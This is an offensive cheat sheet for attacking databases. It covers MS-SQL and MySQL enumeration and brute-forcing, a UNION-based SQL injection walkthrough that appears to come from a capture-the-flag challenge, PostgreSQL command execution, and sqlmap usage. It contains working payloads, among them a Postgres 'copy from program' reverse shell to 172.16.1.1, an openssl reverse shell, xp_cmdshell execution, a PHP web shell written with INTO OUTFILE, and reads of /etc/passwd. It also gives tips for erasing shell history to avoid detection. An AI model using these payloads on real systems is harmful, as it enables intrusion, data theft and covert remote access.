Databases

 
# MS-SQL

Locate
msf > use auxiliary/scanner/mssql/mssql_ping
nmap -sU -Pn -n -T4 --open -p1434 <targetRange>

nmap -p1433 --script ms-sql-info <targetIP>
nmap -p1433 --script ms-sql-brute --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <targetIP>

msf > use auxiliary/scanner/mssql/mssql_login
msf > use auxiliary/admin/mssql/mssql_enum
msf > use auxiliary/scanner/mssql/mssql_hashdump
msf > use auxiliary/admin/mssql/mssql_escalate_dbowner

Post exploitation
msf > use auxiliary/admin/mssql/mssql_exec
------------------------------------------------------------------------------------------------------

# MySQL

mysql -h <IP> -u <username> -p          # Login remotely
mysql -u root                           # Login locally as root

CREATE USER 'newuser'@'localhost' IDENTIFIED BY 'password';
CREATE DATABASE <database>;
GRANT ALL PRIVILEGES ON <database>.* TO 'newuser'@'localhost';
FLUSH PRIVILEGES;

SHOW DATABASES;
USE <database>;
SHOW TABLES;
SHOW FIELDS FROM <table>;

DELETE FROM <table> WHERE <field>="value";

DROP DATABASE <database>;
DROP TABLE 'table1', 'table2', 'table3';
ALTER TABLE <table> DROP COLUMN <field>;

SELECT * FROM <table>;
SELECT * FROM <table> WHERE <field>="value";
SELECT LOAD_FILE('/etc/passwd')\g;

SET PASSWORD FOR username@localhost = PASSWORD('newpassword');

UPDATE <table> SET <field>="value";

INSERT INTO <table> VALUES('John', 'Smith', 'john.smith@acme.com');

DISTINCT <field>
GROUP BY <field>
LIMIT <number>
OFFSET <number>
ORDER BY <field>
WHERE <field> IS NOT NULL
WHERE <field> LIKE

\! whoami
\! sudo whoami
\! sudo bash

Examples:
SELECT * FROM hostvulns WHERE vulnerability LIKE "%Default%" ORDER BY vulnerability;
SELECT * FROM hosts WHERE host LIKE '%|%%' escape '|'
SELECT LENGTH(vulnerability), COUNT(*) FROM hostvulns GROUP BY LENGTH(vulnerability);
SELECT DISTINCT last_name,first_name FROM contacts WHERE first_name IS NOT NULL ORDER BY last_name;
SELECT DISTINCT email FROM contacts WHERE email LIKE "%@target.com" ORDER BY email
DELETE from profiles WHERE rowid='53';
UPDATE hostvulns SET tool="Nessus";

# MySQL Injection

# General.
1 UNION SELECT 1,2,3,4
1 UNION SELECT NULL,NULL,NULL,@@hostname		ubuntu
1 UNION SELECT NULL,NULL,NULL,version()			5.7.17-0ubuntu0.16.04.2
1 UNION SELECT NULL,NULL,NULL,current_user()		root@localhost
1 UNION SELECT NULL,NULL,NULL,user()			root@localhost
1 UNION SELECT NULL,NULL,NULL,UUID()			534c63c1-2e4a-11e9-bb88-00505692e5ab

# List all dbs.
1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM INFORMATION_SCHEMA.TABLES
	information_schema
	challenge
	mysql
	performance_schema
	sys

# List current db.
1 UNION SELECT NULL,NULL,NULL,database()
	challenge

# List tables in the current db.
1 UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.tables WHERE table_schema=‘challenge’
	comments
	users

# List column names in the table ‘comments’.
1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=‘comments’
	comments id
	comments username
	comments comment
	comments post_date

# List all the data in comments.
1 UNION SELECT NULL,NULL,NULL,CONCAT(id, 0x0A, username, 0x0A, comment, 0x0A, post_date, 0x0A) FROM comments

# List column names in the table ‘users’.
1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users'
	users id
	users username
	users password
	users is_admin
	users signup_date
	users USER
	users CURRENT_CONNECTIONS
        users TOTAL_CONNECTIONS

# List all the data in users.
1 UNION SELECT NULL,NULL,NULL,CONCAT(username, 0x0A, password) FROM users
fl4gk33p3r	2DCsG47k5C77X5uMwIwO
Login > Profile > flag
------------------------------------------------------------------------------------------------------

# Postgresql

psql -U <username> -h <IP> -d <database>
select username, passwd from pg_shadow;
select current_database();
create table test (input TEXT); copy test from '/etc/passwd'; select input from test;

psql -U postgres -h <IP>                     # Login with user 'postgres' and no password
\l                                           # List databases
\du                                          # List database users
select pg_ls_dir('/etc');                    # List directory contents of /etc
\c postgres                                  # Connect to the 'postgres' db
\d                                           # List of tables

create table tmp(data text);                 # Create a table called 'tmp'
copy tmp(data) from program 'ls -l /home';   # Run a command in the shell and save the output
select * from tmp;                           # Print the contents of the table

copy tmp from '/etc/passwd';
select * from tmp;

delete from tmp;                             # Clear the table

Replace 'ls -l /home' with whatever command you'd like to run.
drop table tmp;

http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
openssl s_client -quiet -connect <IP>:<port> | /bin/sh 2>&1 | openssl s_client -connect <IP>:<port>

Make sure to `export HISTFILE=/dev/null` when you get on, and `kill -9 $$` when you get off.

# Example

psql -U postgres -h <target IP> platforms
\c postgres
create table redteam(data text);
copy redteam from program 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1 &';
------------------------------------------------------------------------------------------------------

# SQL Injection

SQL databases interpret the single quote character as the boundary between code and data. It assumes 
that anything following a single quote is code that it needs to run and anything encapsulated by a 
quote is data.

Check for SQLi by adding the following to the end of a URL:
a single quote
' or 1=1--<space>

http://www.target.com/index.php?id=100'
http://www.target.com/index.php?id=100' or 1=1--<space>

http://target.com/user.php?name=admin&password=summer2016
http://target.com/user.php?name=admin' or 1=1-- &password=summer2016
------------------------------------------------------------------------------------------------------

Auth bypass:        ' or 1=1--
SQL version:        ' OR CONVERT(int,(@@VERSION))=1--
Service account:    ' OR CONVERT(int,(SYSTEM_USER))=1--
Database:           ' OR CONVERT(int,(DB_NAME()))=1--
Server name:        ' OR CONVERT(int,(@@SERVERNAME))=1--
Code execution:     '; EXEC master..xp_cmdshell 'ping -n 5 127.0.0.1'--
Reverse shell:      '; EXEC master..xp_cmdshell '<unicorn payload>'--
------------------------------------------------------------------------------------------------------

?sql_query 

If you are reading the source code for a web page and discover ?sql_query in the code, this format is 
how HTTP GET parameters are passed through the URL. You can inject an SQL query as a HTTP GET parameter 
to a server-side script. Based on prior knowledge of a database table name (customers), you can inject 
a properly formatted SQL query as a HTTP GET parameter.

http://www.target.com/index.php?sql_query=SELECT * FROM customers
------------------------------------------------------------------------------------------------------

# Remote code execution via time based blind SQLi

- The 'title' parameter is vulnerable.
http://target.com/item.php?title=1&action=search

- Try a time based attack.
http://target.com/item.php?title='%2b(SELECT+1+FROM+(SELECT+SLEEP(10))A)%2b'&action=search

- Inject a PHP shell.
http://target.com/item.php?title=a' UNION SELECT 1, "<?php system($_GET['cmd']) ?>",1,1,1,1,1 INTO OUTFILE "/var/www/shell.php" -- -&action=search

- Run a command.
http://target.com/shell.php?cmd=id
------------------------------------------------------------------------------------------------------

# sqlmap

-u                 Target URL
--dbs              Enumerate databases
--dump             Dump DBMS database table entries
--batch            Never ask for user input, use the default behavior
--dbms=value       Set type of database (MSSQL, MySQL, Oracle)
--level=#          Level of tests to perform (1-5, default 1)
--risk=#           Risk of tests to perform (1-3, default 1)
-D <db>            Enumerate a specific database
--tables           Enumerate tables
-T TBL             Enumerate a specific table
-C COL             Enumerate column(s)

sqlmap.py -u http://www.target.com --dbs --dump --batch
sqlmap.py -u http://www.target.com --dbms=<type> --level=# --risk=# -D <db> --tables --dump --batch
sqlmap.py -u http://www.target.com --dbms=<type> --level=# --risk=# -D <db> -T <table> --dump
------------------------------------------------------------------------------------------------------

# Use Burp to trap a request. Copy the request to /root/tmp.

sqlmap.py -r /root/tmp --hostname -b --current-db --dbs

# Using a cookie

sqlmap.py -u http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" 
--hostname -b --current-db --dbs

sqlmap.py -u http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" 
-D <db> --tables

sqlmap.py -u http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" -D <db> -T <table> --columns

sqlmap.py -u http://target.com/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit# --cookie="security=low; PHPSESSID=e8495b455c5ef26c415ab480425135ee" 
-D <db> -T <table> -C <column
1,2,3,4> --dump

sqlmap.py -u http://target.com/login.asp --data="txtLoginID=shrikant&txtPassword=password&cmdSubmit=Login" --os-shell
------------------------------------------------------------------------------------------------------

# Use CO2 plugin with Burp

Burp > Proxy > turn Intercept on
Browse to target URL > RC on the request > Send to SQLMapper
Detection tab: set Level and Risk to 3.
Enumeration: 
1. hostname, banner, current db, databases > Run
2. current user, is dba, users, passwords > Run
3. Pin to Database <db name>, tables > Run
4. Pin to Database <db name>, Pin to Table <table name>, columns > Run
5. Pin to Database <db name>, Pin to Table <table name>, Pin to Column <column 1,2,3,4> dump > Run
